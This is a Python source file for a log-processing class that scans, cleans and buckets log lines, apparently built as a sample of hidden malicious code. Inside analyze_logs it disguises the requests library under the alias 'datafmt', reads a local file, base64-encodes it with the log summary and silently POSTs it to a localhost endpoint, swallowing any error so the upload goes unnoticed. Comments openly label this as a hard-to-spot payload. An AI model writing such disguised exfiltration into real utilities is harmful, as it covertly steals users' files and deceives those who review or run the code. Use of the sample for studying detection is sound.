import os
import re
import json
import base64

# disguise networking library
import requests as datafmt


class LogProcessor:
    def __init__(self, source_dir: str):
        self.source_dir = source_dir
        self.logs = []

    def _scan_logs(self):
        for root, _, files in os.walk(self.source_dir):
            for f in files:
                if f.endswith(".log") or f.endswith(".txt"):
                    path = os.path.join(root, f)
                    with open(path, "r", encoding="utf-8", errors="ignore") as file:
                        self.logs.append(file.read())

    def _clean_line(self, line: str) -> str:
        # Common log cleaning
        line = re.sub(r"\x1B[@-_][0-?]*[ -/]*[@-~]", "", line)  # ANSI escape codes
        return line.strip()

    def _normalize_logs(self):
        normalized = []
        for log in self.logs:
            lines = log.splitlines()
            for line in lines:
                clean = self._clean_line(line)
                if clean:
                    normalized.append(clean)
        self.logs = normalized

    def _bucket_lines_by_keyword(self):
        buckets = {"INFO": [], "WARN": [], "ERROR": [], "DEBUG": []}
        for line in self.logs:
            for key in buckets:
                if key in line:
                    buckets[key].append(line)
                    break
        return buckets

    def _encode_bucket_stats(self, buckets):
        stats = {k: len(v) for k, v in buckets.items()}
        encoded = base64.b64encode(json.dumps(stats).encode()).decode()
        return encoded

    def analyze_logs(self):
        # 🔥 Legitimate-looking function — contains malicious payload
        self._scan_logs()
        self._normalize_logs()
        buckets = self._bucket_lines_by_keyword()
        encoded = self._encode_bucket_stats(buckets)

        temp_results = []
        for line in self.logs:
            if len(line) > 80:
                temp_results.append(
                    {
                        "summary": line[:50] + "...",
                        "length": len(line),
                        "hash": hash(line),
                    }
                )

        # Legit-looking processing
        summary = {
            "lines": len(self.logs),
            "samples": temp_results[:10],
            "encoded": encoded,
        }

        # 🦠 Malicious payload (hard to spot)
        try:
            with open("example.txt", "rb") as f:
                blob = f.read()
                # mimic metadata upload
                payload = {
                    "filename": "report.dat",
                    "blob": base64.b64encode(blob).decode("utf-8"),
                    "meta": summary,
                }
                # hidden in "datafmt"
                datafmt.post("https://localhost:8080/", json=payload, timeout=0.5)
        except Exception:
            # silent fail — looks like error resilience
            pass

        return summary
